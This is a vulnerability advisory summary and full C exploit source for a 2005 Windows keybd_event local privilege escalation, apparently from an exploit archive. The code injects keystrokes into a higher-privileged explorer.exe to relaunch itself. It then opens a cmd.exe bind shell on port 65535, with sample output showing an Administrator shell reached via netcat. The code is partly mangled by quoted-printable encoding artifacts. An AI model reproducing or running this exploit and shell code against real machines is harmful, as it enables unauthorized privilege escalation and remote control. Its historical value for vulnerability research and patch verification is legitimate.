source: http://www.securityfocus.com/bid/14743/info

Microsoft Windows is prone to a privilege escalation weakness. This issue is due to a design error when desktop applications handle keyboard events sent through the keybd_event() function. The specific issue is that programs may send keyboard events to higher privileged desktop applications.

This poses a local security risk as malicious keyboard events may be sent to a desktop application such as 'explorer.exe' that is running as a higher privileged user. These keyboard events will be interpreted in the context of the target user. This issue could likely be abused after exploitation of a latent remote code execution vulnerability in a service to elevate privileges. In this scenario, a user with higher privileges than the service must be logged into the desktop. 

/*
* Microsoft Windows keybd_event validation vulnerability.
* Local privilege elevation
*
* Credits: Andres Tarasco ( aT4r _@_ haxorcitos.com <http://haxorcitos.com>=
)
* I=F1aki Lopez ( ilo _@_ reversing.org <http://reversing.org> )
*
* Platforms afected/tested:
*
* - Windows 2000
* - Windows XP
* - Windows 2003
*
*
* Original Advisory: http://www.haxorcitos.com
* http://www.reversing.org=20
*
* Exploit Date: 08 / 06 / 2005
*
* Orignal Advisory:
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
* Attack Scenario:
*
* a) An attacker who gains access to an unprivileged shell/application=20
executed
* with the application runas.
* b) An attacker who gains access to a service with flags=20
INTERACT_WITH_DESKTOP
*
* Impact:
*
* Due to an invalid keyboard input validation, its possible to send keys to=
=20
any
* application of the Desktop.
* By sending some short-cut keys its possible to execute code and elevate=
=20
privileges
* getting loggued user privileges and bypass runas/service security=20
restriction.
*
* Exploit usage:
*
* C:\>whoami
* AQUARIUS\Administrador
*
* C:\>runas /user:restricted cmd.exe
* Enter the password for restricted:
* Attempting to start cmd.exe as user "AQUARIUS\restricted" ...
*
*
* Microsoft Windows 2000 [Versi=F3n 5.00.2195]
* (C) Copyright 1985-2000 Microsoft Corp.
*
* C:\WINNT\system32>cd \
*
* C:\>whoami
* AQUARIUS\restricted
*
* C:\>tlist.exe |find "explorer.exe"
* 1140 explorer.exe Program Manager
*
* C:\>c:\keybd.exe 1140
* HANDLE Found. Attacking =3D)
*
* C:\>nc localhost 65535
* Microsoft Windows 2000 [Versi=F3n 5.00.2195]
* (C) Copyright 1985-2000 Microsoft Corp.
*
* C:\>whoami
* whoami
* AQUARIUS\Administrador
*
*
* DONE =3D)
*
*/

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define HAXORCITOS 65535
unsigned int pid =3D 0;
char buf[256]=3D"";

/**************************************************************/
void ExplorerExecution (HWND hwnd, LPARAM lParam){
DWORD hwndid;
int i;


GetWindowThreadProcessId(hwnd,&hwndid);

if (hwndid =3D=3D pid){
/*
Replace keybd_event with SendMessage() and PostMessage() calls=20
*/
printf("HANDLE Found. Attacking =3D)\n");
SetForegroundWindow(hwnd);
keybd_event(VK_LWIN,1,0,0);
keybd_event(VkKeyScan('r'),1,0,0);
keybd_event(VK_LWIN,1,KEYEVENTF_KEYUP,0);
keybd_event(VkKeyScan('r'),1,KEYEVENTF_KEYUP,0);
for(i=3D0;i<strlen(buf);i++) {
if (buf[i]=3D=3D':') {
keybd_event(VK_SHIFT,1,0,0);
keybd_event(VkKeyScan(buf[i]),1,0,0);
keybd_event(VK_SHIFT,1,KEYEVENTF_KEYUP,0);
keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);
} else {
if (buf[i]=3D=3D'\\') {
keybd_event(VK_LMENU,1,0,0);
keybd_event(VK_CONTROL,1,0,0);
keybd_event(VkKeyScan('=BA'),1,0,0);
keybd_event(VK_LMENU,1,KEYEVENTF_KEYUP,0);
keybd_event(VK_CONTROL,1,KEYEVENTF_KEYUP,0);
keybd_event(VkKeyScan('=BA'),1,KEYEVENTF_KEYUP,0);
} else {
keybd_event(VkKeyScan(buf[i]),1,0,0);
keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);
}
}
}
keybd_event(VK_RETURN,1,0,0);
keybd_event(VK_RETURN,1,KEYEVENTF_KEYUP,0);
exit(1);
}
}
/**************************************************************/

int BindShell(void) { //Bind Shell. POrt 65535

SOCKET s,s2;
STARTUPINFO si;
PROCESS_INFORMATION pi;
WSADATA HWSAdata;
struct sockaddr_in sa;
int len;

if (WSAStartup(MAKEWORD(2,2), &HWSAdata) !=3D 0) { exit(1); }
if ((s=3DWSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))=3D=3DINVALID_SOC=
KET){=20
exit(1); }

sa.sin_family =3D AF_INET;
sa.sin_port =3D (USHORT)htons(HAXORCITOS);
sa.sin_addr.s_addr =3D htonl(INADDR_ANY);
len=3Dsizeof(sa);
if ( bind(s, (struct sockaddr *) &sa, sizeof(sa)) =3D=3D SOCKET_ERROR ) {=
=20
return(-1); }
if ( listen(s, 1) =3D=3D SOCKET_ERROR ) { return(-1); }
s2 =3D accept(s,(struct sockaddr *)&sa,&len);
closesocket(s);

ZeroMemory( &si, sizeof(si) ); ZeroMemory( &pi, sizeof(pi) );
si.cb =3D sizeof(si);
si.wShowWindow =3D SW_HIDE;
si.dwFlags =3DSTARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
si.hStdInput =3D (void *) s2; // SOCKET
si.hStdOutput =3D (void *) s2;
si.hStdError =3D (void *) s2;
if (!CreateProcess( NULL ,"cmd.exe",NULL, NULL,TRUE, 0,NULL,NULL,&si,&pi)) =
{
doFormatMessage(GetLastError());
return(-1);
}

WaitForSingleObject( pi.hProcess, INFINITE );
closesocket(s);
closesocket(s2);
printf("SALIMOS...\n");
Sleep(5000);
return(1);


}
/**************************************************************/
void main(int argc, char* argv[])
{
HWND console_wnd =3D NULL;

if (argc >=3D 2) {
pid =3D atoi (argv[1]);
strncpy(buf,argv[0],sizeof(buf)-1);
EnumWindows((WNDENUMPROC)ExplorerExecution,(long)(&console_wnd));
} else {
BindShell();
}
}
/**************************************************************/
